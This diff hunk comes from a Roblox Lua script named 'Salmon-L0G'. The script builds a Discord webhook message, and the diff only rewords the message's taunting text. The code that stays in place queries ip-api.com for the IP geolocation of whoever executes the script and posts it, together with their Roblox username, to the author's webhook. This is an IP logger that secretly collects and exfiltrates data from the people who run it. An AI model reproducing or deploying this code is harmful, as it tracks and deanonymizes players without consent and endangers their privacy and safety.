@@ -15,10 +15,10 @@ local data = {
             ["username"] = "Salmon-L0G", --webhook name thing idk
             ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
     
-    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXECUTED UR LOGGER LOL", --normal message
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
     ["embeds"] = {
        {
-           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
+           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
            ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
            ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
            ["color"] = 14680319,
